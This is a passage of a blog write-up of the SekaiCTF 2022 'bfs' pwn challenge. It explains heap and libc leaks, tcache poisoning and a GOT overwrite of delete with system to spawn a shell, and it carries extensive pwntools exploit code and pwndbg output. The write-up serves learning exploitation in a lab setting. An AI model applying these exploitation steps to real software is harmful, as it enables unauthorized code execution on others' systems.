+# Actually the queue implementation is kinda bad so we don't even need to use the vuln to populate it o/
+</span>
+<span class="k">def</span> <span class="nf">populatequeue</span><span class="p">():</span>
+    <span class="n">edges</span> <span class="o">=</span> <span class="p">[[</span><span class="mi">0</span><span class="p">,</span> <span class="n">i</span><span class="p">]</span> <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mi">256</span><span class="p">)]</span>
+    <span class="n">sendtestcase</span><span class="p">(</span><span class="mi">256</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">512</span><span class="p">,</span> <span class="n">edges</span><span class="p">)</span>
+    <span class="n">edges</span> <span class="o">=</span> <span class="p">[[</span><span class="mi">0</span><span class="p">,</span> <span class="n">i</span><span class="p">]</span> <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mi">256</span><span class="p">)]</span>
+    <span class="n">sendtestcase</span><span class="p">(</span><span class="mi">256</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">512</span><span class="p">,</span> <span class="n">edges</span><span class="p">)</span>
+    <span class="n">p</span><span class="p">.</span><span class="n">clean</span><span class="p">(</span><span class="mf">0.2</span><span class="p">)</span>
+</code></pre></div></div>
+
+<p>Later, we will discuss how to fill the queue arbitrarily rather than values being popped off as soon as we add them, letting us fill the heap as required.</p>
+
+<h2 id="beginning-to-leak-critical-values">Beginning to leak critical values</h2>
+<h3 id="heap-address">Heap address</h3>
+<p>The first vector chunk for the queue will be <em>before</em> the arrays we can OOB on. However, if we do 512 queue pushes twice (1024) in total. What will happen is</p>
+
+<ul>
+  <li>New chunk(after our OOB arrays)</li>
+  <li>New chunk is freed</li>
+  <li>Another new chunk is allocated, will be on top of the old chunk because of how the tcache works</li>
+</ul>
+
+<p>Most notably there will be a chunk after our oob arrays which is freed, letting us manipulate the heap.</p>
+
+<p>What can we leak from our OOB read with the heap chunk? In this glibc version the <code class="language-plaintext highlighter-rouge">tcache_key</code> value is now just random as opposed to the address of the <code class="language-plaintext highlighter-rouge">tcache_perthread_struct</code>, so we’re going to have to resort to the encrypted tcache pointer.</p>
+
+<p>Tcache “safe linking” pointer encryption is relatively simple - the pointer is encrypted as <code class="language-plaintext highlighter-rouge">P ^ (L &gt;&gt; 12)</code> where P is the pointer value and L is the location at which the pointer is going to be stored. In this case, since the chunk is the only one on the tcache, P is a null pointer, So we get a free leak of the top nibbles of a heap address. The last three nibbles are deterministic anyway, and the program has relatively little noise(as well as a docker being provided) so we can easily rebase the heap address.</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">safelink</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">P</span><span class="p">,</span> <span class="n">L</span><span class="p">:</span> <span class="p">(</span><span class="n">L</span> <span class="o">&gt;&gt;</span> <span class="mi">12</span><span class="p">)</span> <span class="o">^</span> <span class="n">P</span>
+<span class="n">cleanup</span> <span class="o">=</span> <span class="k">lambda</span><span class="p">:</span> <span class="n">p</span><span class="p">.</span><span class="n">clean</span><span class="p">(</span><span class="mf">0.2</span><span class="p">)</span>
+<span class="n">populatequeue</span><span class="p">()</span>
+<span class="n">populatequeue</span><span class="p">()</span>
+<span class="c1"># Null safe link ptr, easy to decode
+</span><span class="n">leak</span> <span class="o">=</span> <span class="p">(</span><span class="n">u64</span><span class="p">(</span><span class="n">read</span><span class="p">(</span><span class="mh">0x11020</span> <span class="o">+</span> <span class="mh">0x110</span><span class="p">,</span> <span class="mi">8</span><span class="p">))</span> <span class="o">&lt;&lt;</span> <span class="mi">12</span><span class="p">)</span> <span class="o">+</span> <span class="mh">0x350</span>
+<span class="n">heapbase</span> <span class="o">=</span> <span class="n">leak</span> <span class="o">-</span> <span class="mh">0x23350</span>
+<span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="sa">f</span><span class="s">"Heap base: </span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">heapbase</span><span class="p">)</span><span class="si">}</span><span class="s">"</span><span class="p">)</span>
+</code></pre></div></div>
+
+<p>The offsets are so large because the <code class="language-plaintext highlighter-rouge">adj_matrix</code> array is 65536 bytes long. The offset of the chunk afterwards is pretty much just <code class="language-plaintext highlighter-rouge">size of parents array + size of adj_matrix array + size of string buffer for input</code>, with a few extra 16’s added because of how the heap works.</p>
+
+<p>Anyway, with this, we can leak the heap address. Onto libc!!</p>
+
+<h3 id="leaking-the-libc-address">Leaking the libc address</h3>
+<h4 id="a-better-heap-primitive">A better heap primitive</h4>
+<p>The best way to leak the libc base in a heap exploit is to leak an unsorted bin pointer after either freeing a really large chunk, or filling up the tcache for that size(max 7) and then freeing another chunk of that size. (For those who don’t know, the unsorted bin doubly linked list is terminated not by null pointers but by pointers to the bin location itself in glibc. This is useful for a couple cases with unlinking, and also for us exploiters 😛)</p>
+
+<p>We don’t have the option to allocate and free chunks greater than tcache size, so tcache filling it is.</p>
+
+<p>But there’s an issue: if values keep getting popped off the queue as we add them, the linearity won’t help us. As demonstrated earlier, the queue will end up reallocting at the same two addresses, and the tcache will never get to above one chunk in it.</p>
+
+<p>Instead, we must exploit the vulnerability I discussed earlier with the queue. Instead of using unfindable ends like we have been previously, lets make the bfs algorithm actually find a valid path 😁</p>
+
+<p>That’ll allow some values to stay in the queue as we wish, which is pretty useful. We can build a graph with 0 connecting to all other nodes, and search for 255, which will be pushed(and not popped) last. Since it only goes one layer deep, there won’t be any popping of values 1-255. This, however, creates an issue for repetition.</p>
+
+<p>Next time we call the bfs algorithm, the first value to be popped off the queue will be 1, since that was most recently pushed. That means, if we send the first graph once more, it won’t really work out in our favour, since it’ll traverse starting at 1, then 2, etc.</p>
+
+<p>The solution is to keep track of what the first value on the queue will be, and set the graph up such that every other node is connected to that node.</p>
+
+<p>For future, sometimes we won’t want to populate the queue to completion. To account for this I implemented a feature that allows it to stop on the last population at a certain value. This will be useful later, after we achieve tcache poisoning</p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">first</span> <span class="o">=</span> <span class="mi">0</span>
+<span class="k">def</span> <span class="nf">populatenofree</span><span class="p">(</span><span class="n">num</span><span class="p">,</span> <span class="n">partial</span><span class="o">=</span><span class="bp">None</span><span class="p">):</span>
+    <span class="c1"># Make it find it so it doesnt pop off(need to make sure that doesnt mess up future traversals doe)
+</span>    <span class="k">global</span> <span class="n">first</span>
+    <span class="k">for</span> <span class="n">j</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">num</span><span class="p">):</span>
+        <span class="n">edges</span> <span class="o">=</span> <span class="p">[[</span><span class="n">first</span><span class="p">,</span> <span class="n">i</span><span class="p">]</span> <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">list</span><span class="p">(</span><span class="nb">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">first</span><span class="p">))</span> <span class="o">+</span> <span class="nb">list</span><span class="p">(</span><span class="nb">range</span><span class="p">(</span><span class="n">first</span> <span class="o">+</span> <span class="mi">1</span><span class="p">,</span><span class="mi">256</span><span class="p">))]</span>
+        <span class="k">if</span> <span class="n">j</span> <span class="o">==</span> <span class="n">num</span> <span class="o">-</span> <span class="mi">1</span> <span class="ow">and</span> <span class="n">partial</span> <span class="ow">is</span> <span class="ow">not</span> <span class="bp">None</span><span class="p">:</span>
+            <span class="n">edges2</span> <span class="o">=</span> <span class="p">[]</span>
+            <span class="k">for</span> <span class="n">edge</span> <span class="ow">in</span> <span class="n">edges</span><span class="p">:</span>
+                <span class="k">if</span> <span class="n">edge</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">==</span> <span class="n">partial</span><span class="p">:</span>
+                    <span class="k">break</span>
+                <span class="k">else</span><span class="p">:</span>
+                    <span class="n">edges2</span><span class="p">.</span><span class="n">append</span><span class="p">(</span><span class="n">edge</span><span class="p">)</span>
+            <span class="n">sendtestcase</span><span class="p">(</span><span class="n">partial</span><span class="p">,</span> <span class="n">first</span><span class="p">,</span> <span class="n">partial</span> <span class="o">-</span> <span class="mi">1</span><span class="p">,</span> <span class="n">edges2</span><span class="p">)</span>
+        <span class="k">else</span><span class="p">:</span>
+            <span class="n">sendtestcase</span><span class="p">(</span><span class="mi">256</span><span class="p">,</span> <span class="n">first</span><span class="p">,</span> <span class="mi">255</span><span class="p">,</span> <span class="n">edges</span><span class="p">)</span>
+        <span class="n">first</span> <span class="o">+=</span> <span class="mi">1</span>
+    <span class="n">p</span><span class="p">.</span><span class="n">clean</span><span class="p">(</span><span class="mf">0.2</span><span class="p">)</span>
+</code></pre></div></div>
+
+<h4 id="leaking-libc">Leaking libc</h4>
+<p>From there, the libc leak is relatively intuitive, we just populate the queue a whole load (about 16 or above should do) and then use an unfindable value to pop every value off of the queue, successfully dumping a chunk into the unsorted bin for some juicy leaks.</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">populatenofree</span><span class="p">(</span><span class="mi">18</span><span class="p">)</span>
+<span class="c1"># Unfindable, pop everything off the queue, freeing a bunch of chunks and placing a libc pointer strategically on the heap
+</span><span class="n">sendtestcase</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">512</span><span class="p">,</span> <span class="p">[[</span><span class="mi">0</span><span class="p">,</span><span class="mi">1</span><span class="p">]])</span>
+<span class="n">recvdata</span><span class="p">()</span>
+<span class="n">libcleak</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">read</span><span class="p">(</span><span class="mh">0x11e20</span> <span class="o">+</span> <span class="mh">0x10</span><span class="p">,</span> <span class="mi">8</span><span class="p">))</span>
+<span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="sa">f</span><span class="s">"Libc leak: </span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">libcleak</span><span class="p">)</span><span class="si">}</span><span class="s">"</span><span class="p">)</span>
+<span class="n">libc</span><span class="p">.</span><span class="n">address</span> <span class="o">=</span> <span class="n">libcleak</span> <span class="o">-</span> <span class="mh">0x219ce0</span>
+<span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="sa">f</span><span class="s">"Libc base: </span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">libc</span><span class="p">.</span><span class="n">address</span><span class="p">)</span><span class="si">}</span><span class="s">"</span><span class="p">)</span>
+</code></pre></div></div>
+
+<p>After being able to rebase libc, the main exploit can now begin!</p>
+
+<h2 id="leveraging-our-primitives-and-leaks-into-a-shell">Leveraging our primitives and leaks into a shell</h2>
+<p>So, we have an oob write, an oob read, good allocation primitives and some leaks. How are we gonna turn that into a shell?</p>
+
+<p>A classic free hook replace with system would be in order here, but with this challenge being one of the latest glibcs, allocation hooks have been removed.</p>
+
+<p>Running a simple checksec, we see these protections(yes, I use kali, I’m deeply sorry)</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──(kali㉿kali)-[~/CTFs/sekai/dist]
+└─$ pwn checksec bfs  
+[*] '/home/kali/CTFs/sekai/dist/bfs'
+    Arch:     amd64-64-little
+    RELRO:    Partial RELRO
+    Stack:    Canary found
+    NX:       NX enabled
+    PIE:      No PIE (0x400000)
+</code></pre></div></div>
+
+<p>No PIE and partial RELRO is perfect for a GOT overwrite. Looking at the GOT, basically all of the function names were mangled. I used <a href="http://demangler.com/">http://demangler.com/</a> to demangle them, and eventually found that the function name <code class="language-plaintext highlighter-rouge">_ZdlPvm</code> demangles to <code class="language-plaintext highlighter-rouge">operator delete(void*, unsigned long)</code>, i.e it’s the delete function. This is <strong>big</strong>.</p>
+
+<p>My plan was as follows:</p>
+<ul>
+  <li>Use out-of-bounds write to execute a tcache poisoning attack</li>
+  <li>Get a queue chunk to allocate on top of _ZdlPvm@got (I am going to refer to it as delete@got for the rest of the writeup)</li>
+  <li>Overwrite the address stored at delete@got with system@libc</li>
+  <li>This means that whenever the program tries to free something, it will call system instead. Get the queue to free a chunk beginning with /bin/sh or something similar.</li>
+</ul>
+
+<p>There is an issue with my tcache poisoning plan though - unfortunately the tcache code sets the second qword of an allocated chunk to nulls, to prevent the <code class="language-plaintext highlighter-rouge">tcache_key</code> from being leaked. In terms of the GOT, that can be a bit catastrophic, and caused a useful function pointer to be garbled.</p>
+
+<p>I ended up instead attempting to get an allocation at <code class="language-plaintext highlighter-rouge">delete@got - 16</code> since the value at <code class="language-plaintext highlighter-rouge">delete@got - 16 + 8</code> never got called. The value at <code class="language-plaintext highlighter-rouge">delete@got - 16</code> did get called though, so I couldn’t just fill it with garble until I got to delete@got. We’ll see my solution in a second.</p>
+
+<p>Getting tcache poisoning was pretty simple, just find the offset to a tcache chunk to target and then overwrite its pointer with another safely linked version.</p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1"># Luckily we can calculate every single value on the heap as we know heap + libc and the heap is deterministic
+</span><span class="n">loc</span> <span class="o">=</span> <span class="n">heapbase</span> <span class="o">+</span> <span class="mh">0x23e40</span>
+
+<span class="c1"># Tcache poison to delete@got 
+</span><span class="n">edges</span> <span class="o">=</span> <span class="n">edit_data</span><span class="p">(</span><span class="n">safelink</span><span class="p">(</span><span class="n">heapbase</span> <span class="o">+</span> <span class="mh">0x23c30</span><span class="p">,</span> <span class="n">loc</span><span class="p">),</span> <span class="n">safelink</span><span class="p">(</span><span class="n">e</span><span class="p">.</span><span class="n">got</span><span class="p">[</span><span class="s">'_ZdlPvm'</span><span class="p">]</span> <span class="o">-</span> <span class="mi">16</span><span class="p">,</span> <span class="n">loc</span><span class="p">),</span> <span class="mh">0x11b10</span><span class="p">)</span>
+
+<span class="n">sendtestcase</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="n">edges</span><span class="p">)</span>
+<span class="n">cleanup</span><span class="p">()</span>
+<span class="n">first</span> <span class="o">=</span> <span class="mi">0</span>
+</code></pre></div></div>
+<p>Note that after undoing all of the work <code class="language-plaintext highlighter-rouge">populatenofree</code> did, first must be reset to reflect that the queue is now empty.</p>
+
+<p>Checking in pwndbg, we get tcache poisoning!
+<code class="language-plaintext highlighter-rouge">0x210 [ 7]: 0x1ac3e40 —▸ 0x407060</code></p>
+
+<h3 id="setting-up-for-the-delete">Setting up for the delete</h3>
+<p>We need to construct a queue chunk such that it’s beginning is a nice string for system to be called on. But how to do that?</p>
+
+<p>They need to be pushed in order, but most importantly they need nothing else to get pushed in between them. My solution was to essentially find out what <code class="language-plaintext highlighter-rouge">first</code> was, and connect it to the first character. Then, find out what <code class="language-plaintext highlighter-rouge">first + 1</code> was, and connect it to the second character, and so forth. That way as it pops off those values from the queue to traverse, it’ll find only the character we want at that position and push it onto the queue.</p>
+
+<p>Note that the “from” character is always pushed no matter what, and then it won’t find any children of <code class="language-plaintext highlighter-rouge">first</code> since the “from”(which we set to the first character) will have vis set to 1. But then <code class="language-plaintext highlighter-rouge">first + 1</code> will have the second character as a child, etc.</p>
+
+<p>The issue with this is that the logic totally breaks down if there are repeated characters. This means <code class="language-plaintext highlighter-rouge">/bin/sh</code> is off the cards, but <code class="language-plaintext highlighter-rouge">sh</code> works just as fine. Later, we will get this issue with null bytes, to which my solution was to pretty much break up the writing.</p>
+
+<p>Some debugging led me to getting that stopping at <code class="language-plaintext highlighter-rouge">0xdd</code> while filling would mean the next character goes on its own chunk. After we’re done, we stop at 0xfd(256 - 3) to fill up that chunk, such that the next data will be written at the GOT!</p>
+
+<p>Note that we use the dest value of the last character we want to push so it stops there and doesn’t pop everything off the queue, destroying all of our hard work!</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">populatenofree</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span><span class="n">partial</span><span class="o">=</span><span class="mh">0xdd</span><span class="p">)</span>
+
+<span class="n">topush</span> <span class="o">=</span> <span class="sa">b</span><span class="s">"sh</span><span class="se">\x00</span><span class="s">"</span>
+
+<span class="c1"># Make each of the things that are gonna be popped off point to a char of the string we wanna push
+</span><span class="n">edges</span> <span class="o">=</span> <span class="p">[[</span><span class="n">first</span> <span class="o">+</span> <span class="n">i</span><span class="p">,</span> <span class="n">topush</span><span class="p">[</span><span class="n">i</span><span class="p">]]</span> <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="nb">len</span><span class="p">(</span><span class="n">topush</span><span class="p">))]</span>
+<span class="k">print</span><span class="p">(</span><span class="n">edges</span><span class="p">)</span>
+
+<span class="n">sendtestcase</span><span class="p">(</span><span class="mi">256</span><span class="p">,</span> <span class="n">topush</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span> <span class="n">topush</span><span class="p">[</span><span class="o">-</span><span class="mi">1</span><span class="p">],</span> <span class="n">edges</span><span class="p">)</span>
+<span class="n">first</span> <span class="o">+=</span> <span class="mi">3</span>
+
+<span class="n">populatenofree</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="n">partial</span><span class="o">=</span><span class="mh">0xfd</span><span class="p">)</span>
+</code></pre></div></div>
+
+<p>Note that we manually increment <code class="language-plaintext highlighter-rouge">first</code> since it’s going to have changed.</p>
+
+<h3 id="executing-the-got-overwite-to-pop-a-shell">Executing the GOT overwite to pop a shell</h3>
+<p>We’re almost there!</p>
+
+<p>So the solution to the problem I presented earlier is just to overwrite the first function pointer with a return gadget. As long as the return vlaue of the function is unimportant, this should cause no issues. The function we end up overwriting, demangled, is <code class="language-plaintext highlighter-rouge">std::basic_ostream&lt;char, std::char_traits&lt;char&gt; &gt;&amp; std::operator&lt;&lt; &lt;std::char_traits&lt;char&gt; &gt;(std::basic_ostream&lt;char, std::char_traits&lt;char&gt; &gt;&amp;, char const*)</code> which is a function for output. The return value should be relatively unimportant, although do note that after we mess up the function pointer it sort of screws the whole program’s output from then on lol</p>
+
+<p>Anyway, remember what I said about the null bytes? That’s relevant here. Obviously the address we’re trying to write has two null bytes at its end, but we can’t do two null bytes at once! The best we can do is do them separately. We write the first 7 bytes of the address first.</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">rop</span> <span class="o">=</span> <span class="n">ROP</span><span class="p">(</span><span class="n">libc</span><span class="p">)</span>
+<span class="n">full</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="n">rop</span><span class="p">.</span><span class="n">ret</span><span class="p">.</span><span class="n">address</span><span class="p">)</span>
+<span class="n">topush</span> <span class="o">=</span> <span class="n">full</span><span class="p">[:</span><span class="mi">7</span><span class="p">]</span>
+<span class="n">edges</span> <span class="o">=</span> <span class="p">[[</span><span class="n">first</span> <span class="o">+</span> <span class="n">i</span><span class="p">,</span> <span class="n">topush</span><span class="p">[</span><span class="n">i</span><span class="p">]]</span> <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="nb">len</span><span class="p">(</span><span class="n">topush</span><span class="p">))]</span>
+
+
+<span class="n">sendtestcase</span><span class="p">(</span><span class="mi">256</span><span class="p">,</span> <span class="n">topush</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span> <span class="n">topush</span><span class="p">[</span><span class="o">-</span><span class="mi">1</span><span class="p">],</span> <span class="n">edges</span><span class="p">)</span>
+
+<span class="n">first</span> <span class="o">+=</span> <span class="mi">7</span>
+</code></pre></div></div>
+
+<p>Now for the part that drove me insane for a whole half hour. From here writing a singular null byte and then some garbage and then libc@system at delete@got seems easy, but it’s totally not. Why not? One word - loop.</p>
+
+<p>Remember what I said about the parents array <em>usually</em> not setting up an infinite loop? Well it turns out when you abuse the bfs algorithm such a high amount, sometimes you don’t really get what you want!</p>
+
+<p>The result? After getting a successful overwrite, when trying to crawl back and find the path, the program gets stuck in an infinite loop. The last character I pushed would go up to 27 in the crawl, and from there it would infinite loop as 27’s parent had been set to all sorts of things in the past. Changing the <code class="language-plaintext highlighter-rouge">dest</code> value didn’t help for various reasons - trust me, I tried.</p>
+
+<p>Luckily, there was one glorious, beautiful, amazing line of code that would save me from this horror.
+<code class="language-plaintext highlighter-rouge">parent[from] = from;</code></p>
+
+<p>If I could just set <code class="language-plaintext highlighter-rouge">from</code> to 27, it would fix its entry in the parent array <em>forever</em>. Then, it’s all rainbows and cupcakes! That would <em>also</em> cause 27 or 0x1b to be pushed onto the queue though, we don’t want that happening just about anywhere. Since we’re planning to garble up the address just before delete@got anyway, that’s the perfect place to let it happen. All we need to do now is do the extra null byte(and one other byte for good measure) on its own, and then the rest.</p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">topush</span> <span class="o">=</span> <span class="sa">b</span><span class="s">"</span><span class="se">\x00\x08</span><span class="s">"</span>
+<span class="n">edges</span> <span class="o">=</span> <span class="p">[[</span><span class="n">first</span> <span class="o">+</span> <span class="n">i</span><span class="p">,</span> <span class="n">topush</span><span class="p">[</span><span class="n">i</span><span class="p">]]</span> <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="nb">len</span><span class="p">(</span><span class="n">topush</span><span class="p">))]</span>
+
+
+<span class="n">sendtestcase</span><span class="p">(</span><span class="mi">256</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">topush</span><span class="p">[</span><span class="o">-</span><span class="mi">1</span><span class="p">],</span> <span class="n">edges</span><span class="p">)</span>
+
+<span class="n">first</span> <span class="o">+=</span> <span class="mi">2</span>
+
+<span class="n">topush</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x0102030405060708</span><span class="p">)[</span><span class="mi">2</span><span class="p">:]</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">libc</span><span class="p">.</span><span class="n">symbols</span><span class="p">[</span><span class="s">'system'</span><span class="p">])[:</span><span class="mi">6</span><span class="p">]</span>
+<span class="n">edges</span> <span class="o">=</span> <span class="p">[[</span><span class="n">first</span> <span class="o">+</span> <span class="n">i</span><span class="p">,</span> <span class="n">topush</span><span class="p">[</span><span class="n">i</span><span class="p">]]</span> <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="nb">len</span><span class="p">(</span><span class="n">topush</span><span class="p">))]</span>
+<span class="k">print</span><span class="p">(</span><span class="n">edges</span><span class="p">)</span>
+<span class="k">print</span><span class="p">(</span><span class="n">first</span><span class="p">,</span> <span class="n">edges</span><span class="p">)</span>
+
+<span class="n">sendtestcase</span><span class="p">(</span><span class="mi">256</span><span class="p">,</span> <span class="mi">27</span><span class="p">,</span> <span class="n">topush</span><span class="p">[</span><span class="o">-</span><span class="mi">1</span><span class="p">],</span> <span class="n">edges</span><span class="p">)</span>
+<span class="k">print</span><span class="p">(</span><span class="nb">hex</span><span class="p">(</span><span class="n">libc</span><span class="p">.</span><span class="n">symbols</span><span class="p">[</span><span class="s">'system'</span><span class="p">])</span>
+</code></pre></div></div>
+
+<p>We only send 6 bytes of my 0x0102030405060708 garble, since one was already written and the other is going to become <code class="language-plaintext highlighter-rouge">0x1b</code> as 27 is pushed.</p>
+
+<p>This fixes the issue, and voila!</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>pwndbg&gt; x/10qwgx 0x407060
+0x407060 &lt;_ZStlsISt11char_traitsIcEERSt13basic_ostreamIcT_ES5_PKc@got.plt&gt;:     0x00007fa95764ccd6      0x0102030405061b08
+0x407070 &lt;_ZdlPvm@got.plt&gt;:     0x00007fa957673d60      0x00007fa9579a68f0
+0x407080 &lt;__stack_chk_fail@got.plt&gt;:    0x0000000000401100      0x00007fa957665420
+0x407090 &lt;exit@got.plt&gt;:        0x0000000000401120      0x00007fa9579a8570
+0x4070a0 &lt;_ZNSt7__cxx1112basic_stringIcSt11char_traitsIcESaIcEEC1Ev@got.plt&gt;:   0x00007fa9579b70a0      0x0000000000401150
+pwndbg&gt; x/x 0x00007fa957673d60
+0x7fa957673d60 &lt;__libc_system&gt;: 0x74ff8548fa1e0ff3
+</code></pre></div></div>
+
+<p>As always, now we just make the bfs algorithm attempt to find an unfindable value, popping everything off the queue and getting the chunks freed in the process. delete(“sh”) will be called, actually calling system(“sh”)!</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">"256 0"</span><span class="p">)</span>
+<span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">"0 69420"</span><span class="p">)</span>
+<span class="n">p</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>
+</code></pre></div></div>
+
+<p>The exploit fails sometimes because of some specifics with bytes, repeats etc., but it’s relatively reliable. With that, we can pop a shell and get the flag.</p>
+
+<h3 id="flag-sekaiwhat_do_you_mean_my_integers_have_to_be_checked_i_never_needed_to_do_that_in_programming_competitions">Flag: SEKAI{what_do_you_mean_my_integers_have_to_be_checked?_i_never_needed_to_do_that_in_programming_competitions}</h3>
+
+<p>The author had a way less complicated solution than I did, but I still had loads of fun doing it, and learned quite a bit about c++ in the process! I hope this helps people to learn something too!</p>
+
+<p>Full exploit here: <a href="https://github.com/Day91/Writeups/blob/master/SekaiCTF/bfs.py">https://github.com/Day91/Writeups/blob/master/SekaiCTF/bfs.py</a></p>
+
+
+</article>
+
+
+
+<div class="post-pagination">
+  
+    <a class="post-pagination-item left" href="/pwn/2022/09/03/MapleCTF-2022-Maplewave.html">
+      <i class="fas fa-chevron-left"></i> <span class="post-pagination-title">MapleCTF 2022: Maplewave Challenges
+</span>
+    </a>
+  
+  
+  
+    <span class="post-pagination-item right"></span>
+  
+</div>
+
+        </main>
+
+        <footer class="footer">
+          <small>
+            &copy; <time datetime="2022-10-07T12:00:49+01:00">2022</time>&nbsp;<a href="" target="_blank">Day91</a>. All rights reserved.
+          </small>
+        </footer>
+      </div>
+    </div>
+
+    <label for="sidebar-checkbox" class="sidebar-toggle"></label>
+
+    
+
+    
+  </body>
+</html>
